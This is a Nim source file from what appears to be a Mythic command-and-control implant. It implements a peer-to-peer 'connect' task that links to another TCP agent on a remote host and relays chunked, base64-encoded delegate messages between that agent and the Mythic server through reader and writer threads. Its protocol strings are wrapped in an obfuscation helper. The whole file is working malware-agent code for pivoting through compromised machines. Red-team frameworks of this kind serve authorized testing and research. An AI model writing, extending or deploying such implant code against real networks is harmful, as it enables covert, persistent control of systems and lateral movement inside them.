import std/[json, strutils, base64, strformat, os, net, nativesockets, tables, endians]
import ../utils/m_responses
import ../utils/debug
import ../utils/strenc
import ../config

type
  ConnectConnectionObj = object
    agentUuid: string
    socket: Socket
    active: bool
    receivedEof: bool  # True when reader thread sends empty seq EOF signal
    inChannel: ptr Channel[seq[byte]]   # Mythic → Writer → Socket
    outChannel: ptr Channel[seq[byte]]  # Socket → Reader → Mythic
    readerThread: Thread[ptr ConnectConnectionObj]
    writerThread: Thread[ptr ConnectConnectionObj]
  
  ConnectConnection = ref object
    agentUuid: string
    socket: Socket
    active: bool
    receivedEof: bool
    inChannel: ptr Channel[seq[byte]]
    outChannel: ptr Channel[seq[byte]]
    readerThread: Thread[ptr ConnectConnectionObj]
    writerThread: Thread[ptr ConnectConnectionObj]
    sharedPtr: ptr ConnectConnectionObj  # Stable pointer for threads

var
  activeConnectConnections* {.threadvar.}: Table[string, ConnectConnection]

proc sendChunkedMessage(socket: Socket, message: seq[byte]) =
  ## Send message with 4-byte length prefix (big-endian) - synchronous version
  var lengthBytes: array[4, byte]
  var length = message.len.uint32
  bigEndian32(addr lengthBytes[0], addr length)
  
  discard socket.send(addr lengthBytes[0], 4)
  if message.len > 0:
    discard socket.send(unsafeAddr message[0], message.len)

proc receiveChunkedMessage(socket: Socket): seq[byte] =
  ## Receive message with 4-byte length prefix (big-endian) - synchronous version
  var lengthBytes: array[4, byte]
  let recvLen = socket.recv(addr lengthBytes[0], 4)
  if recvLen != 4:
    return @[]
  
  var length: uint32
  bigEndian32(addr length, addr lengthBytes[0])
  
  if length == 0:
    return @[]
  
  result = newSeq[byte](length)
  let dataRecv = socket.recv(addr result[0], length.int)
  if dataRecv != length.int:
    return @[]

proc readFromTcpAgent(conn: ptr ConnectConnectionObj) {.thread.} =
  ## Reader thread: reads from TCP agent socket and sends to main thread via outChannel
  debug "[DEBUG] Connect reader thread started"
  
  while conn.active:
    try:
      # Read chunked message from TCP agent
      let data = receiveChunkedMessage(conn.socket)
      
      if data.len == 0:
        # Connection closed or error
        debug "[DEBUG] Connect reader: Connection closed, sending EOF and exiting"
        conn.active = false  # Mark as inactive to stop writer thread too
        conn.outChannel[].send(@[])  # EOF signal
        break
      
      debug &"[DEBUG] Connect reader: Received {data.len} bytes from TCP agent"
      
      # Send to main thread
      conn.outChannel[].send(data)
      
    except:
      let e = getCurrentException()
      debug &"[DEBUG] Connect reader error: {e.msg}, sending EOF"
      conn.active = false  # Mark as inactive to stop writer thread too
      conn.outChannel[].send(@[])  # EOF signal
      break
  
  # Close socket from reader side when exiting
  try:
    conn.socket.close()
  except:
    discard
  
  debug "[DEBUG] Connect reader thread exited"

proc writeToTcpAgent(conn: ptr ConnectConnectionObj) {.thread.} =
  ## Writer thread: receives data from main thread via inChannel and writes to TCP agent socket
  debug "[DEBUG] Connect writer thread started"
  
  while conn.active:
    try:
      # Use tryRecv with timeout instead of blocking recv to check conn.active periodically
      let (hasData, data) = conn.inChannel[].tryRecv()
      
      if not hasData:
        # No data available, sleep briefly and check again
        sleep(50)  # 50ms
        continue
      
      if data.len == 0:
        # Exit signal
        debug "[DEBUG] Connect writer: Received exit signal"
        break
      
      debug &"[DEBUG] Connect writer: Sending {data.len} bytes to TCP agent"
      
      # Send to TCP agent
      sendChunkedMessage(conn.socket, data)
      
    except:
      let e = getCurrentException()
      debug &"[DEBUG] Connect writer error: {e.msg}"
      conn.active = false  # Signal that connection is dead
      break
  
  debug "[DEBUG] Connect writer thread exited"

proc createConnectMessage*(agentUuid: string, message: string): JsonNode =
  ## Create a delegate message for the connected agent
  result = %*{
    obf("delegates"): [
      %*{
        obf("message"): message,
        obf("uuid"): agentUuid,
        obf("c2_profile"): "tcp"
      }
    ]
  }

proc checkActiveConnectConnections*(): seq[JsonNode] =
  ## Check all active connect connections for data from TCP agents
  ## Returns array of delegate messages to send to Mythic
  result = @[]
  var toDelete: seq[string] = @[]
  var toRekey: seq[tuple[oldUuid: string, newUuid: string, conn: ConnectConnection]] = @[]
  
  if activeConnectConnections.len == 0:
    activeConnectConnections = initTable[string, ConnectConnection]()
    return
  
  for agentUuid, conn in activeConnectConnections:
    # Check for data from thread (non-blocking) - drain channel even if inactive
    var (hasData, data) = conn.outChannel[].tryRecv()
    
    debug &"[DEBUG] Connect: Checking connection for {agentUuid}, hasData: {hasData}, dataLen: {data.len}"
    
    while hasData:
      if data.len == 0:
        # EOF signal from reader thread
        debug &"[DEBUG] Connect: Connection to {agentUuid} EOF received from reader thread"
        
        # Send edge removal notification
        result.add(%*{
          obf("edges"): [
            %*{
              obf("source"): "",  # Will be filled by agent
              obf("destination"): agentUuid,
              obf("action"): obf("remove"),
              obf("c2_profile"): "tcp"
            }
          ]
        })
        
        conn.active = false
        if not conn.sharedPtr.isNil:
          conn.sharedPtr.active = false
        conn.receivedEof = true
        break
      
      # Parse message and wrap as delegate
      let messageStr = cast[string](data)
      
      # Extract real UUID from message (format: base64(UUID + encrypted_data))
      # This is important because the user-provided UUID might be a placeholder
      var realUuid = agentUuid
      try:
        let decoded = decode(messageStr)
        if decoded.len >= 36:
          realUuid = decoded[0..<36]
          debug &"[DEBUG] Connect: Extracted UUID from message: {realUuid}"
          
          # If this is the first message and UUID differs, we need to rekey the connection
          if realUuid != agentUuid:
            debug &"[DEBUG] Connect: Real agent UUID is {realUuid}, different from user-provided {agentUuid}"
            toRekey.add((oldUuid: agentUuid, newUuid: realUuid, conn: conn))
          else:
            debug &"[DEBUG] Connect: UUID matches user-provided {agentUuid}"
      except Exception as e:
        debug &"[DEBUG] Connect: Could not extract UUID from message: {e.msg}, using original"
      
      debug &"[DEBUG] Connect: Received {data.len} bytes from {realUuid}, forwarding to Mythic"
      result.add(createConnectMessage(realUuid, messageStr))
      
      # Check for more data
      (hasData, data) = conn.outChannel[].tryRecv()
    
    # Only delete if we've received EOF signal from reader thread
    if conn.receivedEof:
      toDelete.add(agentUuid)
  
  # Rekey connections with real UUIDs
  for item in toRekey:
    if activeConnectConnections.hasKey(item.oldUuid):
      activeConnectConnections.del(item.oldUuid)
      activeConnectConnections[item.newUuid] = item.conn
      debug &"[DEBUG] Connect: Rekeyed connection from {item.oldUuid} to {item.newUuid}"
  
  # Delete inactive connections after iteration
  for agentUuid in toDelete:
    if activeConnectConnections.hasKey(agentUuid):
      let conn = activeConnectConnections[agentUuid]
      
      # Join threads first
      try:
        joinThread(conn.readerThread)
      except:
        discard
      try:
        joinThread(conn.writerThread)
      except:
        discard
      
      # Free shared memory used by threads
      if not conn.sharedPtr.isNil:
        if not conn.sharedPtr.inChannel.isNil:
          conn.sharedPtr.inChannel[].close()
          deallocShared(conn.sharedPtr.inChannel)
        if not conn.sharedPtr.outChannel.isNil:
          conn.sharedPtr.outChannel[].close()
          deallocShared(conn.sharedPtr.outChannel)
        deallocShared(conn.sharedPtr)
      
      try:
        conn.socket.close()
      except:
        discard
      
      activeConnectConnections.del(agentUuid)
      debug &"[DEBUG] Connect: Cleaned up connection to {agentUuid}"

proc rekeyConnectConnection*(oldUuid: string, newUuid: string): bool =
  ## Re-key a connection from old UUID to new UUID (happens when Mythic assigns a new UUID after checkin)
  ## Returns true if re-keying was successful, false if connection doesn't exist
  if not activeConnectConnections.hasKey(oldUuid):
    debug &"[DEBUG] Connect: Cannot rekey - no connection for {oldUuid}"
    return false
  
  let conn = activeConnectConnections[oldUuid]
  activeConnectConnections.del(oldUuid)
  activeConnectConnections[newUuid] = conn
  debug &"[DEBUG] Connect: Rekeyed connection from {oldUuid} to {newUuid}"
  return true

proc forwardDelegateToConnect*(agentUuid: string, message: string): bool =
  ## Forward a delegate message to the connected agent
  ## Returns true if message was queued, false if no active connection
  
  # Debug: show all active connections
  debug "[DEBUG] Connect: Active connections: "
  for uuid, conn in activeConnectConnections:
    debug &"  - {uuid} (active: {conn.active})"
  
  if not activeConnectConnections.hasKey(agentUuid):
    debug &"[DEBUG] Connect: No active connection for agent {agentUuid}"
    return false
  
  let conn = activeConnectConnections[agentUuid]
  if not conn.active:
    debug &"[DEBUG] Connect: Connection for agent {agentUuid} is not active"
    return false
  
  try:
    # Message from Mythic is base64-encoded; TCP profile's decryptPayload expects base64
    # So we keep it as-is and just convert string to bytes
    let messageBytes = cast[seq[byte]](message)
    conn.inChannel[].send(messageBytes)
    debug &"[DEBUG] Connect: Queued {messageBytes.len} bytes (base64) for agent {agentUuid}"
    return true
  except:
    let e = getCurrentException()
    debug &"[DEBUG] Connect: Failed to queue message for {agentUuid}: {e.msg}"
    return false

proc handleConnect*(taskId: string, params: JsonNode): JsonNode =
  ## Handle connecting to a P2P TCP agent
  try:
    debug "[DEBUG] Connect: Starting connect task"
    
    # Parse connection info
    let connInfo = params[obf("connection_info")]
    let host = connInfo[obf("host")].getStr()
    let agentUuid = connInfo[obf("agent_uuid")].getStr()
    let c2ProfileName = connInfo[obf("c2_profile")][obf("name")].getStr()
    
    # Get port from c2_profile parameters
    var port = 9999  # default
    if connInfo.hasKey(obf("c2_profile")) and 
       connInfo[obf("c2_profile")].hasKey(obf("parameters")) and
       connInfo[obf("c2_profile")][obf("parameters")].hasKey(obf("port")):
      let portValue = connInfo[obf("c2_profile")][obf("parameters")][obf("port")]
      if portValue.kind == JInt:
        port = portValue.getInt()
      else:
        port = parseInt(portValue.getStr())
    
    debug &"[DEBUG] Connect: Connecting to {host}:{port} (agent: {agentUuid})"
    
    # Only support TCP for now
    if c2ProfileName != "tcp":
      return mythicError(taskId, "Only TCP P2P linking is currently supported")
    
    # Check if already connected
    if activeConnectConnections.hasKey(agentUuid):
      return mythicError(taskId, &"Already connected to agent {agentUuid}")
    
    # Connect to the TCP agent
    var socket = newSocket()
    
    try:
      socket.connect(host, Port(port))
      
      debug "[DEBUG] Connect: Connected successfully"
      
      # Keep socket in blocking mode for reader/writer threads
      # The threads use blocking recv/send operations
      
      # Create channels for thread communication
      var inChan = cast[ptr Channel[seq[byte]]](allocShared0(sizeof(Channel[seq[byte]])))
      inChan[].open()
      var outChan = cast[ptr Channel[seq[byte]]](allocShared0(sizeof(Channel[seq[byte]])))
      outChan[].open()
      
      # Create connection object
      var conn = ConnectConnection(
        agentUuid: agentUuid,
        socket: socket,
        active: true,
        inChannel: inChan,
        outChannel: outChan
      )
      
      # Allocate stable shared memory for thread-safe access
      let connPtr = cast[ptr ConnectConnectionObj](allocShared0(sizeof(ConnectConnectionObj)))
      connPtr.agentUuid = agentUuid
      connPtr.socket = socket
      connPtr.active = true
      connPtr.receivedEof = false
      connPtr.inChannel = inChan
      connPtr.outChannel = outChan
      
      # Store shared pointer in ref object for later cleanup
      conn.sharedPtr = connPtr
      
      # Store connection in table
      activeConnectConnections[agentUuid] = conn
      
      # Start threads using stable shared pointer
      createThread(conn.readerThread, readFromTcpAgent, connPtr)
      createThread(conn.writerThread, writeToTcpAgent, connPtr)
      
      # Send edge notification to Mythic
      let edgeNotification = %* {
        obf("edges"): [
          %* {
            obf("source"): "",  # Will be filled in by agent
            obf("destination"): agentUuid,
            obf("action"): obf("add"),
            obf("c2_profile"): "tcp"
          }
        ]
      }
      
      # Return both success message and edge notification
      result = %* {
        obf("user_output"): &"Connected to TCP agent at {host}:{port}",
        obf("completed"): true,
        obf("task_id"): taskId,
        obf("edges"): edgeNotification[obf("edges")]
      }
      
    except:
      let e = getCurrentException()
      debug &"[DEBUG] Connect: Connection error: {e.msg}"
      try:
        socket.close()
      except:
        discard
      return mythicError(taskId, &"Failed to connect to TCP agent: {e.msg}")
    
  except Exception as e:
    debug &"[DEBUG] Connect: Task error: {e.msg}"
    return mythicError(taskId, &"Connect task failed: {e.msg}")
